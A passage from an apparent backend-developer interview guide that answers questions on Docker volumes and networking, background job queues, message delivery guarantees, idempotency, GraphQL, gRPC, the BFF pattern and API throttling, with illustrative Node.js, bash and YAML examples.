|--|--------|-----------|
| Location | Managed by Docker (`/var/lib/docker/volumes/`) | Specific path on host filesystem |
| Portability | ✅ High — Docker manages location | ❌ Low — tied to specific host path |
| Performance | ✅ Better (especially on Mac/Windows) | Slower on non-Linux hosts |
| Backup | Easy with `docker volume` commands | Manual |
| Use case | Database data, persistent app data | Source code hot-reload in dev |

```bash
# ── Named Volume (recommended for data persistence) ──────────────────
# Docker manages location automatically
docker run -v postgres_data:/var/lib/postgresql/data postgres:15
# postgres_data volume lives at /var/lib/docker/volumes/postgres_data

# Volume commands
docker volume create postgres_data
docker volume ls
docker volume inspect postgres_data
docker volume rm postgres_data

# Backup a volume
docker run --rm \
  -v postgres_data:/data \
  -v $(pwd):/backup \
  alpine tar czf /backup/postgres_backup.tar.gz /data

# ── Bind Mount (for dev hot-reload) ──────────────────────────────────
# Maps a specific host directory into the container
docker run \
  -v $(pwd)/src:/app/src \       # host path : container path
  -v /app/node_modules \          # anonymous volume: DON'T bind mount node_modules
  my-node-app

# In docker-compose.yml:
volumes:
  - ./src:/app/src                # bind mount for hot-reload
  - /app/node_modules             # protect container's node_modules from host override
```

**Why `-v /app/node_modules` (anonymous volume)?**
If you bind-mount `.` to `/app`, it overwrites the container's `/app/node_modules` with your (possibly empty or different OS) host `node_modules`. The anonymous volume for `/app/node_modules` takes precedence and protects it.

> 📖 Reference: [Docker Volumes — Docker Docs](https://docs.docker.com/storage/volumes/)

---

**Q31. What is a Docker network? How do containers communicate with each other?**

**Answer:**

Docker networks allow containers to communicate securely. By default, containers on the same network can reach each other by **container name** (Docker's internal DNS).

**Network types:**

| Type | Description | Use case |
|------|------------|---------|
| `bridge` | Default; isolated network on a single host | Most applications, local dev |
| `host` | Container shares host's network stack | High-performance, no port mapping |
| `none` | No network access | Security sandbox |
| `overlay` | Multi-host networking | Docker Swarm / distributed |

```bash
# ── Create and use a custom bridge network ───────────────────────────
docker network create myapp-net

docker run -d --name db \
  --network myapp-net \
  -e POSTGRES_PASSWORD=secret \
  postgres:15

docker run -d --name api \
  --network myapp-net \
  -e DATABASE_URL=postgres://postgres:secret@db:5432/myapp \
  # ↑ "db" resolves to the postgres container's IP automatically
  myapp:latest

# Containers on the same network talk by name:
# api container: psql postgresql://postgres:secret@db:5432/myapp  ✅
# "db" resolves to postgres container's internal IP
```

```yaml
# docker-compose.yml — compose handles networking automatically
services:
  api:
    build: .
    # Compose creates a default network: "myapp_default"
    # api can reach db as "db:5432"

  db:
    image: postgres:15
    # Also on "myapp_default" network automatically

  # Separate private network for internal services
  internal-service:
    image: my-internal
    networks:
      - internal          # only on internal network — api can't reach it directly

networks:
  default:                # used by api and db
  internal:               # used only by internal services
    driver: bridge
```

```bash
# Debug networking
docker network ls
docker network inspect myapp-net

# Test connectivity from inside a container
docker exec -it api sh
ping db            # should resolve ✅
curl http://db:5432 # test port connectivity
```

> 📖 Reference: [Docker Networking — Docker Docs](https://docs.docker.com/network/)

---

## 5. Background Jobs & Task Queues

---

**Q32. What is a background job? Give 3 real-world examples of when you'd use one.**

**Answer:**

A **background job** is a task that runs asynchronously, outside the request/response cycle. The HTTP request returns immediately while the job is processed independently.

**Why use background jobs:**
- Long-running tasks would timeout the HTTP request (> 30s).
- Tasks not needed synchronously (sending emails, generating PDFs).
- Retry failed tasks without affecting the user.
- Rate-limit expensive operations (processing 1 image/sec, not 1000/sec).

**3 Real-world examples:**

```js
const { Queue, Worker } = require('bullmq');
const redis = { host: 'localhost', port: 6379 };

// ── Example 1: Welcome email after signup ────────────────────────────
const emailQueue = new Queue('emails', { connection: redis });

// In your signup route:
app.post('/register', async (req, res) => {
  const user = await User.create(req.body);

  // ✅ Don't wait for email — respond immediately
  await emailQueue.add('welcome-email', {
    userId:    user.id,
    email:     user.email,
    firstName: user.firstName
  });

  res.status(201).json({ message: 'Account created! Check your email.' });
  // Response: ~50ms (just DB insert)
  // Email: sent in background within 1-2 seconds
});

// Email worker (runs separately)
const emailWorker = new Worker('emails', async (job) => {
  if (job.name === 'welcome-email') {
    await sendgrid.send({
      to:      job.data.email,
      subject: `Welcome, ${job.data.firstName}!`,
      html:    welcomeEmailTemplate(job.data)
    });
  }
}, { connection: redis });

// ── Example 2: Image resizing/thumbnail generation ───────────────────
const imageQueue = new Queue('image-processing', { connection: redis });

app.post('/posts/:id/photo', upload.single('photo'), async (req, res) => {
  // Save original to S3
  const s3Key = await uploadToS3(req.file.buffer);

  // ✅ Return immediately — processing happens in background
  await imageQueue.add('generate-thumbnails', {
    postId: req.params.id,
    s3Key,
    sizes: [{ w: 800, h: 600 }, { w: 400, h: 300 }, { w: 100, h: 100 }]
  });

  res.json({ message: 'Photo uploaded. Thumbnails generating...' });
});

// ── Example 3: Monthly invoice generation ────────────────────────────
const billingQueue = new Queue('billing', { connection: redis });

// Cron: run on 1st of every month
cron.schedule('0 0 1 * *', async () => {
  const activeSubscriptions = await getActiveSubscriptions();

  for (const sub of activeSubscriptions) {
    await billingQueue.add('generate-invoice', {
      subscriptionId: sub.id,
      billingPeriod: getCurrentBillingPeriod()
    }, {
      attempts: 3,         // retry up to 3 times on failure
      backoff: { type: 'exponential', delay: 5000 }
    });
  }
});
```

> 📖 Reference: [Background Jobs — Microsoft Azure Docs](https://learn.microsoft.com/en-us/azure/architecture/best-practices/background-jobs)

---

**Q33. What is a message queue? How is it different from a task queue?**

**Answer:**

| | Message Queue | Task Queue |
|--|--------------|-----------|
| Purpose | Transport messages between producers and consumers | Execute discrete tasks/jobs by workers |
| Focus | Message delivery and routing | Job execution, retries, scheduling |
| Consumer processes | Message immediately | Job is picked up and processed by a worker |
| Examples | RabbitMQ, AWS SQS, Apache Kafka | BullMQ, Celery, Sidekiq, Temporal |
| Typical use | Event streaming, microservice communication | Background jobs, scheduled tasks |

```
Message Queue:
Producer → [Queue] → Consumer (processes message)
         → [Queue] → Consumer (multiple consumers possible)

Task Queue:
Producer (adds job) → [Queue] → Worker (executes job function)
                              → Worker (another worker)
```

**Message Queue example (RabbitMQ):**

```js
// Producer: another service sends a message
const amqp = require('amqplib');
const conn = await amqp.connect('amqp://localhost');
const ch   = await conn.createChannel();

await ch.assertQueue('order-events', { durable: true });
ch.sendToQueue('order-events',
  Buffer.from(JSON.stringify({ type: 'ORDER_PLACED', orderId: 99 })),
  { persistent: true }
);
// Just sends a message — doesn't care HOW it's processed

// Consumer: processes the message
ch.consume('order-events', (msg) => {
  const event = JSON.parse(msg.content.toString());
  // Route to appropriate handler
  if (event.type === 'ORDER_PLACED') handleOrderPlaced(event);
  ch.ack(msg);
});
```

**Task Queue example (BullMQ):**

```js
// Producer: adds a specific typed job
const queue = new Queue('image-resize', { connection: redis });
await queue.add('thumbnail', { imageUrl: 's3://...', width: 200, height: 200 }, {
  attempts: 3,
  backoff: { type: 'exponential', delay: 1000 },
  delay: 5000,      // run 5 seconds from now
  priority: 10,     // lower number = higher priority
  repeat: { cron: '0 * * * *' }  // run hourly
});

// Worker: executes the job
const worker = new Worker('image-resize', async (job) => {
  const thumbnail = await resizeImage(job.data.imageUrl, job.data.width, job.data.height);
  await uploadThumbnail(thumbnail);
  return { thumbnailUrl: thumbnail.url }; // returned to job result
}, { connection: redis, concurrency: 5 }); // process 5 jobs simultaneously
```

> 📖 Reference: [Message Queue vs Task Queue — CloudAMQP](https://www.cloudamqp.com/blog/message-queue-vs-task-queue.html)

---

**Q34. What is at-least-once vs at-most-once vs exactly-once delivery in message queues?**

**Answer:**

| | At-Most-Once | At-Least-Once | Exactly-Once |
|--|-------------|--------------|-------------|
| What it means | Message delivered 0 or 1 times | Message delivered 1 or more times | Message delivered exactly 1 time |
| Risk | Message loss | Duplicate processing | None |
| Performance | Fastest (no acknowledgment) | Fast (ack after processing) | Slowest (transaction coordination) |
| Complexity | Simple | Simple + handle duplicates | Complex |
| Use case | Metrics, analytics (loss ok) | Most business events | Financial transactions |

**Code examples:**

```js
// ── At-Most-Once: fire and forget ────────────────────────────────────
// If consumer crashes before processing, message is lost
ch.consume('metrics', (msg) => {
  ch.ack(msg);         // ack BEFORE processing
  processMetric(msg);  // if this crashes, message is gone — acceptable for metrics
});

// ── At-Least-Once: ack after success ─────────────────────────────────
// If consumer crashes AFTER processing but before ack, message redelivered → duplicate
ch.consume('order-events', async (msg) => {
  try {
    await processOrder(JSON.parse(msg.content)); // process first
    ch.ack(msg);   // ack AFTER successful processing
  } catch (err) {
    ch.nack(msg, false, true); // nack → requeue for retry
  }
});
// Problem: if crash between processOrder and ack → order processed twice!
// Fix: make processOrder IDEMPOTENT (safe to call twice)

// ── Making at-least-once safe via idempotency ─────────────────────────
ch.consume('payments', async (msg) => {
  const { paymentId, amount, userId } = JSON.parse(msg.content);

  // Check if already processed (idempotency check)
  const existing = await db.query(
    'SELECT id FROM payment_records WHERE payment_id = ?', [paymentId]
  );

  if (!existing) {
    await db.query(
      'INSERT INTO payment_records (payment_id, amount, user_id) VALUES (?, ?, ?)',
      [paymentId, amount, userId]
    );
    await chargeCard(paymentId, amount);
  } else {
    console.log(`Payment ${paymentId} already processed — skipping`);
  }

  ch.ack(msg); // now safe to ack
});

// ── Exactly-Once: using Kafka transactions ────────────────────────────
// Kafka guarantees exactly-once with idempotent producers + transactions
const { Kafka } = require('kafkajs');
const kafka = new Kafka({ brokers: ['localhost:9092'] });
const producer = kafka.producer({ idempotent: true }); // enable idempotency
await producer.connect();

await producer.transaction(async (txn) => {
  await txn.send({ topic: 'orders', messages: [{ value: JSON.stringify(order) }] });
  await txn.sendOffsets({ topics: [{ topic: 'payments', partitions: [...] }] });
  await txn.commit(); // atomic — both send and commit
});
```

> 📖 Reference: [Message Delivery Guarantees — Cloudflare](https://developers.cloudflare.com/queues/reference/delivery-guarantees/)

---

**Q35. What is a dead letter queue (DLQ)? Why is it important?**

**Answer:**

A **Dead Letter Queue** is a special queue where messages are sent when they fail to be processed after the maximum number of retries. Instead of losing failed messages or blocking the main queue, they're parked in the DLQ for investigation and manual reprocessing.

```
Main Queue:
Message → Worker → fails → retry 1 → fails → retry 2 → fails → retry 3
                                                                     ↓
                                                              Dead Letter Queue
                                                              (message preserved)
```

**Why it's important:**
- Failed messages are NOT lost — you can inspect them later.
- The main queue keeps processing other messages (no blocking).
- Operations team can investigate why messages failed and replay them.
- Prevents poison messages from clogging the queue.

**AWS SQS DLQ example:**

```js
const { SQSClient, SendMessageCommand, ReceiveMessageCommand } = require('@aws-sdk/client-sqs');
const sqs = new SQSClient({ region: 'us-east-1' });

// SQS queue configured with DLQ (in AWS console or IaC):
// Main queue: maxReceiveCount = 3
// After 3 failures → message goes to order-processing-dlq

// Main worker
async function processOrderQueue() {
  while (true) {
    const { Messages } = await sqs.send(new ReceiveMessageCommand({
      QueueUrl:            process.env.ORDER_QUEUE_URL,
      MaxNumberOfMessages: 10,
      WaitTimeSeconds:     20   // long polling
    }));

    for (const msg of Messages || []) {
      try {
        const order = JSON.parse(msg.Body);
        await processOrder(order);
        // ✅ Delete on success
        await sqs.send(new DeleteMessageCommand({
          QueueUrl:      process.env.ORDER_QUEUE_URL,
          ReceiptHandle: msg.ReceiptHandle
        }));
      } catch (err) {
        // ❌ Don't delete on failure — SQS will redeliver
        // After maxReceiveCount failures → AWS moves to DLQ automatically
        logger.error('Order processing failed', { error: err.message, order: msg.Body });
      }
    }
  }
}

// DLQ monitoring and reprocessing
async function processDLQ() {
  const { Messages } = await sqs.send(new ReceiveMessageCommand({
    QueueUrl: process.env.ORDER_DLQ_URL,
    MaxNumberOfMessages: 10
  }));

  for (const msg of Messages || []) {
    logger.error('Message in DLQ — needs investigation', {
      messageId: msg.MessageId,
      body:      msg.Body,
      attributes: msg.Attributes  // includes retry count, first failure time
    });

    // After investigation, replay to main queue:
    await sqs.send(new SendMessageCommand({
      QueueUrl:    process.env.ORDER_QUEUE_URL,
      MessageBody: msg.Body
    }));
    // Then delete from DLQ
  }
}

// Set up alert: PagerDuty/Datadog alert when DLQ depth > 0
```

**BullMQ DLQ equivalent (failed jobs):**

```js
const queue = new Queue('orders', { connection: redis });
const worker = new Worker('orders', processOrder, {
  connection: redis,
  // After 3 attempts, job moves to "failed" state (BullMQ's DLQ equivalent)
});

// Monitor failed jobs
const failedJobs = await queue.getFailed(0, 100);
for (const job of failedJobs) {
  console.log('Failed job:', job.id, job.failedReason);
  // Retry individual job:
  await job.retry();
}
```

> 📖 Reference: [Dead Letter Queue — AWS Docs](https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-dead-letter-queues.html)

---

**Q36. What is job idempotency in background processing? How do you ensure a job is safe to retry?**

**Answer:**

A job is **idempotent** if running it multiple times produces the same result as running it once — essential for safe retries when at-least-once delivery can cause duplicates.

**Non-idempotent job (dangerous):**

```js
// ❌ Running this twice charges the user twice!
emailQueue.process('send-invoice', async (job) => {
  const { userId, amount } = job.data;

  const invoice = await createInvoice(userId, amount); // creates a new invoice each time!
  await stripe.charges.create({ amount, customer: userId });
  await sendInvoiceEmail(userId, invoice.id);
});
```

**Making it idempotent — 4 techniques:**

```js
// ── Technique 1: Dedupe key / idempotency token ───────────────────────
emailQueue.process('send-invoice', async (job) => {
  const { userId, billingPeriod } = job.data;

  // Check if invoice already exists for this user + period
  const existing = await db.query(
    'SELECT id FROM invoices WHERE user_id = ? AND billing_period = ?',
    [userId, billingPeriod]
  );

  if (existing) {
    logger.info('Invoice already created — skipping', { existing: existing.id });
    return { invoiceId: existing.id }; // safe to return early
  }

  const invoice = await createInvoice(userId, billingPeriod);
  await stripe.charges.create({
    amount:   invoice.amount,
    customer: userId,
    idempotency_key: `invoice-${invoice.id}` // Stripe deduplication
  });
  await sendInvoiceEmail(userId, invoice.id);
  return { invoiceId: invoice.id };
});

// ── Technique 2: Upsert instead of insert ────────────────────────────
emailQueue.process('update-user-stats', async (job) => {
  const { userId, date, loginCount } = job.data;

  // INSERT ... ON CONFLICT UPDATE is idempotent
  await db.query(`
    INSERT INTO user_stats (user_id, date, login_count)
    VALUES (?, ?, ?)
    ON CONFLICT (user_id, date)
    DO UPDATE SET login_count = EXCLUDED.login_count
  `, [userId, date, loginCount]);
  // Running 3 times = same result ✅
});

// ── Technique 3: Check + set status atomically ────────────────────────
emailQueue.process('send-welcome-email', async (job) => {
  const { userId } = job.data;

  // Atomically mark email as "sending" — only one worker can do this
  const result = await db.query(
    `UPDATE users
     SET welcome_email_status = 'sending'
     WHERE id = ? AND welcome_email_status = 'pending'`,
    [userId]
  );

  if (result.affectedRows === 0) {
    logger.info('Welcome email already sent or sending — skipping');
    return; // another worker already handled it
  }

  try {
    await sendEmail(userId, 'welcome');
    await db.query(
      "UPDATE users SET welcome_email_status = 'sent' WHERE id = ?", [userId]
    );
  } catch (err) {
    // Reset on failure so it can be retried
    await db.query(
      "UPDATE users SET welcome_email_status = 'pending' WHERE id = ?", [userId]
    );
    throw err;
  }
});

// ── Technique 4: Use job.id as idempotency key ────────────────────────
emailQueue.process('resize-image', async (job) => {
  const outputKey = `thumbnails/${job.id}-200x200.jpg`; // unique per job

  // Check if already processed
  const exists = await s3.headObject({ Bucket: 'images', Key: outputKey }).catch(() => null);
  if (exists) return { thumbnailKey: outputKey }; // already done

  const thumbnail = await resizeImage(job.data.sourceKey, 200, 200);
  await s3.putObject({ Bucket: 'images', Key: outputKey, Body: thumbnail });
  return { thumbnailKey: outputKey };
});
```

> 📖 Reference: [Idempotent Workers — Sidekiq Best Practices](https://github.com/sidekiq/sidekiq/wiki/Best-Practices)

---

**Q37. What is the difference between a cron job and an event-driven background job?**

**Answer:**

| | Cron Job | Event-Driven Job |
|--|----------|-----------------|
| Trigger | Time-based schedule | Event or user action |
| When | Predictable (daily, hourly, monthly) | Unpredictable (immediately when event occurs) |
| Latency | High (waits for next schedule) | Low (near-immediate) |
| Examples | Monthly billing, nightly reports, DB cleanup | Send email on signup, resize image on upload |

**Cron job example:**

```js
const cron = require('node-cron');

// ✅ Good for time-based, batch operations

// Run every night at 2 AM
cron.schedule('0 2 * * *', async () => {
  console.log('Running nightly cleanup');
  await db.query(`DELETE FROM sessions WHERE expires_at < NOW()`);
  await db.query(`DELETE FROM temp_uploads WHERE created_at < NOW() - INTERVAL '24 hours'`);
});

// Run on 1st of every month at 8 AM
cron.schedule('0 8 1 * *', async () => {
  console.log('Running monthly invoice generation');
  const subscriptions = await getActiveSubscriptions();

  for (const sub of subscriptions) {
    await billingQueue.add('generate-invoice', { subscriptionId: sub.id });
  }
});

// Every 5 minutes: sync exchange rates
cron.schedule('*/5 * * * *', async () => {
  const rates = await fetchExchangeRates();
  await redis.set('exchange_rates', JSON.stringify(rates), 'EX', 360);
});
```

**Event-driven job example:**

```js
// ✅ Good for immediate reaction to user actions

// Event: user signs up
app.post('/register', async (req, res) => {
  const user = await User.create(req.body);
  // Trigger immediately:
  await emailQueue.add('send-welcome', { userId: user.id });
  await analyticsQueue.add('track-signup', { userId: user.id, source: req.body.referrer });
  await notificationQueue.add('notify-admin', { newUserId: user.id });
  res.status(201).json(user);
});

// Event: order placed
app.post('/orders', async (req, res) => {
  const order = await Order.create(req.body);
  // Trigger immediately:
  await queue.add('send-order-confirmation', { orderId: order.id });
  await queue.add('update-inventory',        { items: order.items });
  await queue.add('notify-warehouse',        { orderId: order.id });
  res.status(201).json(order);
});
```

**When to use cron:**
- Cleanup, maintenance, reporting tasks.
- Periodic syncs with external systems.
- Tasks that MUST run at a specific time.

**When to use event-driven:**
- React immediately to user actions.
- Decouple producer from consumer.
- Handle tasks that vary in volume with user traffic.

> 📖 Reference: [Cron vs Event-Driven — AWS](https://aws.amazon.com/event-driven-architecture/)

---

## 6. API Design Patterns

---

**Q38. What is GraphQL? How does it compare to REST in terms of over-fetching and under-fetching?**

**Answer:**

**GraphQL** is a query language for APIs where the **client specifies exactly what data it needs** — no more, no less. The server exposes a single endpoint.

**Over-fetching (REST problem):**

```
REST: GET /users/42
Response: { id, name, email, phone, address, bio, preferences, createdAt, updatedAt, ... }
// Client only needed: id, name, email
// 80% of the data was wasted bandwidth ← over-fetching

GraphQL: query { user(id: 42) { id name email } }
Response: { user: { id: 42, name: "Alice", email: "alice@example.com" } }
// Gets exactly what was asked for ✅
```

**Under-fetching (REST problem):**

```
REST: Build a user profile page
→ GET /users/42           (user info)
→ GET /users/42/posts     (recent posts)
→ GET /users/42/followers (follower count)
→ GET /users/42/stats     (activity stats)
= 4 separate round trips ← under-fetching (need more data than one endpoint gives)

GraphQL: Single query:
query {
  user(id: 42) {
    id
    name
    email
    recentPosts(limit: 3) { id title createdAt }
    followerCount
    stats { postsCount likesReceived }
  }
}
= 1 round trip, gets everything ✅
```

**GraphQL server example:**

```js
const { ApolloServer, gql } = require('@apollo/server');

const typeDefs = gql`
  type User {
    id: ID!
    name: String!
    email: String!
    orders(limit: Int = 10): [Order!]!
  }

  type Order {
    id: ID!
    total: Float!
    status: String!
    createdAt: String!
  }

  type Query {
    user(id: ID!): User
    users(page: Int, limit: Int): [User!]!
  }

  type Mutation {
    createUser(name: String!, email: String!, password: String!): User!
    updateUser(id: ID!, name: String, email: String): User!
  }
`;

const resolvers = {
  Query: {
    user: (_, { id }) => User.findById(id),
    users: (_, { page = 1, limit = 20 }) => User.findAll({ page, limit }),
  },
  User: {
    orders: (user, { limit }) => Order.findByUserId(user.id, { limit }),
  },
  Mutation: {
    createUser: (_, args) => User.create(args),
  }
};

// REST vs GraphQL comparison:
// REST  → multiple endpoints: GET /users/:id, GET /users/:id/orders
// GraphQL → single endpoint: POST /graphql with query in body
```

> 📖 Reference: [GraphQL vs REST — Apollo](https://www.apollographql.com/blog/graphql-vs-rest)

---

**Q39. What is gRPC? What makes it faster than REST for internal service communication?**

**Answer:**

**gRPC** (Google Remote Procedure Call) is a high-performance, binary RPC framework. You define services and message types in `.proto` files, and gRPC generates client/server code automatically.

**Why gRPC is faster than REST:**

| | REST (JSON over HTTP/1.1) | gRPC (Protobuf over HTTP/2) |
|--|--------------------------|----------------------------|
| Serialization | Text JSON (~5x larger) | Binary Protobuf (~5x smaller) |
| Protocol | HTTP/1.1 (one request per connection) | HTTP/2 (multiplexed streams, header compression) |
| Schema | Optional (OpenAPI) | Required (proto file) — type safety guaranteed |
| Code generation | Manual client | Auto-generated typed clients |
| Streaming | Limited (polling or SSE) | Native bi-directional streaming |
| Performance | ~slower | ~5-10x faster for high-throughput |

**Example:**

```protobuf
// user.proto — service definition
syntax = "proto3";

service UserService {
  rpc GetUser     (GetUserRequest)     returns (User);
  rpc CreateUser  (CreateUserRequest)  returns (User);
  rpc ListUsers   (ListUsersRequest)   returns (stream User);  // server streaming
  rpc WatchUser   (stream UserEvent)   returns (stream User);  // bidirectional
}

message User {
  string id    = 1;
  string name  = 2;
  string email = 3;
  int32  age   = 4;
}

message GetUserRequest { string id = 1; }
message CreateUserRequest {
  string name  = 1;
  string email = 2;
  string password = 3;
}
```

```js
// gRPC server (Node.js)
const grpc     = require('@grpc/grpc-js');
const protoLoader = require('@grpc/proto-loader');

const packageDef = protoLoader.loadSync('user.proto');
const proto      = grpc.loadPackageDefinition(packageDef);

const server = new grpc.Server();
server.addService(proto.UserService.service, {
  getUser: async (call, callback) => {
    const user = await User.findById(call.request.id);
    callback(null, user);
  },
  createUser: async (call, callback) => {
    const user = await User.create(call.request);
    callback(null, user);
  },
  listUsers: async (call) => {
    const users = await User.findAll();
    users.forEach(user => call.write(user));
    call.end();
  }
});
server.bindAsync('0.0.0.0:50051', grpc.ServerCredentials.createInsecure(), () => {
  server.start();
});
```

**When to use gRPC:**
- Internal microservice communication (not public-facing APIs).
- High-throughput scenarios (thousands of calls/sec between services).
- Strong typing needed across polyglot services (Go, Java, Python, Node.js).
- Real-time streaming (chat, live updates, telemetry).

**When to stick with REST:**
- Public APIs consumed by browsers/third parties (gRPC requires HTTP/2 which browsers don't natively support for gRPC).
- Simple CRUD APIs where performance isn't critical.

> 📖 Reference: [gRPC Introduction — gRPC Docs](https://grpc.io/docs/what-is-grpc/introduction/)

---

**Q40. What is the BFF (Backend for Frontend) pattern? When is it useful?**

**Answer:**

**BFF** creates a dedicated backend service tailored specifically for each frontend client (web app, mobile app, third-party API). Instead of one generic API serving all clients, each client gets its own API layer.

```
Without BFF:
Mobile App ─────────┐
Web App ─────────────┼──► Generic API ──► Microservices
Smart TV App ────────┘
(all clients use the same endpoints, get same data shape)

With BFF:
Mobile App ──► Mobile BFF ─────┐
Web App ──────► Web BFF ─────── ├──► Microservices (User, Order, Product, etc.)
Smart TV ──────► TV BFF ────────┘
```

**Real-world example:**

```js
// ❌ Without BFF: generic API returns everything, clients filter what they need
app.get('/api/product/:id', async (req, res) => {
  const product = await productService.getProduct(req.params.id);
  // Returns 40 fields — mobile only needs 8, web needs 20, TV needs 5
  res.json(product);
});

// ✅ With BFF: each client gets exactly what it needs

// Mobile BFF (src/bff/mobile.js)
mobileBff.get('/product/:id', async (req, res) => {
  const [product, inventory, reviews] = await Promise.all([
    productService.getProduct(req.params.id),
    inventoryService.getStock(req.params.id),
    reviewService.getTopReview(req.params.id)
  ]);

  // Optimized for mobile: minimal data, pre-aggregated
  res.json({
    id:          product.id,
    name:        product.name,
    price:       product.price,
    thumbnail:   product.images[0]?.thumbnailUrl, // only thumbnail, not all images
    inStock:     inventory.available > 0,
    rating:      reviews.averageRating,
    reviewCount: reviews.count
    // Only 7 fields — mobile uses exactly these
  });
});

// Web BFF (src/bff/web.js)
webBff.get('/product/:id', async (req, res) => {
  const [product, inventory, reviews, recommendations] = await Promise.all([
    productService.getProduct(req.params.id),
    inventoryService.getDetailedStock(req.params.id),
    reviewService.getReviews(req.params.id, { limit: 5 }),
    recommendationService.getSimilar(req.params.id, { limit: 8 })
  ]);

  // Richer response for web
  res.json({
    product: { ...product, allImages: product.images },
    inventory: { available: inventory.available, warehouse: inventory.warehouse },
    reviews:        reviews,
    recommendations: recommendations
  });
});
```

**When BFF is useful:**
- Different clients need very different data shapes.
- Mobile needs minimal data (bandwidth constraints).
- Reducing client-side aggregation logic (multiple API calls → one BFF call).
- Different auth requirements per client.

**When to avoid BFF:**
- Simple apps with one client type.
- Small teams — maintaining multiple backends has overhead.
- Clients have very similar needs.

> 📖 Reference: [BFF Pattern — Sam Newman](https://samnewman.io/patterns/architectural/bff/)

---

**Q41. What is the difference between a public API and an internal API? How do you design each differently?**

**Answer:**

| Design Concern | Public API | Internal API |
|---------------|-----------|-------------|
| Stability | Must be stable — breaking changes hurt external developers | Can evolve faster — you control all consumers |
| Versioning | Mandatory (`/v1/`, `/v2/`) | Optional — coordinate internally |
| Documentation | Comprehensive (OpenAPI/Swagger, examples, SDKs) | Lighter — internal wikis, code comments |
| Authentication | API keys, OAuth 2.0, rate limiting | mTLS, internal service tokens, VPN |
| Rate limiting | Strict per-client quotas | Looser — trusted internal callers |
| Error messages | User-friendly, no internal details | Can include stack traces, internal codes |
| Schema | Conservative — avoid breaking changes | Can be more flexible |
| Backwards compat | Critical — maintain old versions for years | Less critical |

```js
// ── Public API design ────────────────────────────────────────────────
// /v1/users — versioned, stable, documented, sanitized errors
app.get('/v1/users/:id',
  apiKeyAuth,          // require API key
  rateLimiter,         // 100 req/min per API key
  async (req, res) => {
    const user = await User.findById(req.params.id);
    if (!user) {
      return res.status(404).json({
        error: { code: 'USER_NOT_FOUND', message: 'User not found' }
        // No internal details (no stack trace, no DB column names)
      });
    }
    // Never expose internal fields
    const { password_hash, internal_notes, stripe_customer_id, ...publicUser } = user;
    res.json({ data: publicUser });
  }
);

// ── Internal API design ──────────────────────────────────────────────
// /internal/users — faster, richer, less formal
app.get('/internal/users/:id',
  internalServiceAuth, // validate internal service token
  async (req, res) => {
    const user = await User.findByIdWithAllFields(req.params.id);
    if (!user) {
      return res.status(404).json({
        error: 'User not found',
        query: { userId: req.params.id },  // more debug info ok internally
        timestamp: new Date()
      });
    }
    res.json(user); // full object — internal service can handle it
  }
);
```

> 📖 Reference: [API Design — Zalando Guidelines](https://opensource.zalando.com/restful-api-guidelines/)

---

**Q42. What is API gateway throttling? How does it protect your backend services?**

**Answer:**

**API gateway throttling** limits the rate of requests that can reach your backend, protecting downstream services from overload. It happens BEFORE the request reaches your application servers.

```
Without throttling:
DDoS: 1,000,000 req/sec → Your servers → Overloaded → Crash 💥

With throttling (API Gateway):
1,000,000 req/sec → API Gateway → Allow 10,000/sec → Servers ✅
                                → Return 429 for the rest
```

**Throttling types:**

```
1. Global rate limit:     Max 10,000 req/sec across ALL clients
2. Per-client limit:      Max 100 req/min per API key
3. Per-endpoint limit:    /auth/login limited to 5 req/min (brute-force protection)
4. Burst limit:           Allow 100 req/sec burst, but average 10 req/sec
```

**AWS API Gateway throttling:**

```yaml
# serverless.yml or AWS CDK
provider:
  name: aws
  apiGateway:
    throttling:
      maxRequestsPerSecond: 10000    # global limit
      maxConcurrentRequests: 5000

functions:
  createUser:
    handler: src/users.create
    events:
      - http:
          path: /users
          method: post
          throttling:
            maxRequestsPerSecond: 100  # per-endpoint limit
            maxConcurrentRequests: 50
```

**Custom throttling middleware example:**

```js
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');

// Global rate limit
app.use(rateLimit({
  windowMs: 60 * 1000,   // 1 minute
  max:      1000,         // 1000 requests per minute globally
  standardHeaders: true,  // Return RateLimit-* headers
  legacyHeaders: false,
  store: new RedisStore({ client: redis }), // distributed — works across servers
  handler: (req, res) => {
    res.status(429).json({
      error: 'Too Many Requests',
      retryAfter: Math.ceil(req.rateLimit.resetTime / 1000)
    });
  }
}));

// Stricter limit for auth endpoints
app.use('/auth', rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max:      10,              // only 10 login attempts per 15 minutes per IP
  message:  { error: 'Too many login attempts. Try again in 15 minutes.' }
}));

// Per-user rate limiting (after auth)
const userRateLimit = rateLimit({
  windowMs: 60 * 1000,
  max:      200,
  keyGenerator: (req) => req.user?.userId || req.ip, // key by user ID, not IP
  store: new RedisStore({ client: redis })
});
app.use('/api/', requireAuth, userRateLimit);
```

> 📖 Reference: [API Throttling — AWS API Gateway Docs](https://docs.aws.amazon.com/apigateway/latest/developerguide/api-gateway-request-throttling.html)

---

## 7. NoSQL Databases

---

**Q43. What are the different types of NoSQL databases? (Document, Key-Value, Column-Family, Graph)**

**Answer:**

| Type | Structure | Best for | Examples |
|------|-----------|---------|---------|
| **Document** | JSON/BSON documents | Content, user profiles, catalogs | MongoDB, CouchDB, Firestore |
| **Key-Value** | Simple key → value | Caching, sessions, simple lookups | Redis, DynamoDB, Riak |
| **Column-Family** | Rows with dynamic columns, optimized for column reads | Analytics, time-series, wide tables | Cassandra, HBase, ScyllaDB |
| **Graph** | Nodes and edges (relationships) | Social networks, fraud detection, recommendation | Neo4j, Amazon Neptune, JanusGraph |

**Use case examples:**

```js
// ── Document DB (MongoDB) — flexible schema, nested data ─────────────
const product = {
  _id: ObjectId('...'),
  name: 'iPhone 15',
  category: 'electronics',
  specs: {                     // nested document
    storage: ['128GB', '256GB', '512GB'],
    colors: ['Black', 'White', 'Blue'],
    weight: '171g'
  },
  variants: [                  // array of sub-documents
    { storage: '128GB', color: 'Black', price: 799, sku: 'IP15-128-BLK' },
    { storage: '256GB', color: 'White', price: 899, sku: 'IP15-256-WHT' }
  ],
  reviews: { count: 1523, average: 4.7 }
};
// Fits naturally as a document — no joins needed to get all product info

// ── Key-Value (Redis) — fast simple lookups ───────────────────────────
await redis.set('session:abc123', JSON.stringify({ userId: 42, role: 'admin' }), 'EX', 3600);
await redis.get('session:abc123'); // 0.1ms lookup

// ── Column-Family (Cassandra) — time-series IoT data ─────────────────
// Table: sensor_readings (partition key: sensor_id, clustering: timestamp)
// All readings for one sensor stored together on disk = fast time-range queries
